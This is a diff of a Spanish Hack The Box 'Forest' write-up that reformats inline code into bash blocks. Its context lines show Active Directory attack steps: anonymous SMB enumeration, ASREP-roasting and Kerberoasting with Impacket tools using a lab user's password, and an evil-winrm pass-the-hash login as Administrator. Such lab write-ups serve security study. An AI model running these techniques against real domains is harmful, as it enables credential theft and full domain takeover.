@@ -80,7 +80,11 @@ smbclient -L 10.10.10.82 -N
 
 Vemos que estamos en frente de una maquina Windows Server 2016 Standard de 64 bit pro que se llama **FOREST** en el dominio **htb.local**.
 No vemos ningun recursos compartidos a nivel de red.
-Añadimos el dominio a nuestro `/etc/hosts`.
+Añadimos el dominio a nuestro 
+```bash
+ /etc/hosts 
+```
+.
 
 ### Buscando ususarios con rpcclient y rpcenum {-}
 
@@ -104,7 +108,11 @@ Como aqui ya tenemos un listado de usuarios validos, lanzamos un ataque asproars
 
 ### Asproasting Attack {-}
 
-Los ataques Asproasting se pueden manejar con la utilidad `GetNPUsers.py`
+Los ataques Asproasting se pueden manejar con la utilidad 
+```bash
+ GetNPUsers.py 
+```
+
 
 ```bash
 cd content
@@ -147,7 +155,11 @@ y podemos mirarlo con firefox en localhost
 
 ### Kereroasting attack {-}
 
-Los ataques Kereroasting se pueden manejar con la utilidad `GetUserSPNs.py`
+Los ataques Kereroasting se pueden manejar con la utilidad 
+```bash
+ GetUserSPNs.py 
+```
+
 
 ```bash
 GetUserSPNs.py htb.local/svc-alfresco:s3rvice@10.10.10.161 -request -dc-ip 10.10.10.161
@@ -302,4 +314,8 @@ evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d3372a07ceea
 ![Forest-dcsyc-admi-hash](/assets/images/Forest-dcsync-admin-hash.png) 
 ```
 
-`WHOAMI -> htb\administrator` ;)
+
+```bash
+ WHOAMI -> htb\administrator 
+```
+ ;)
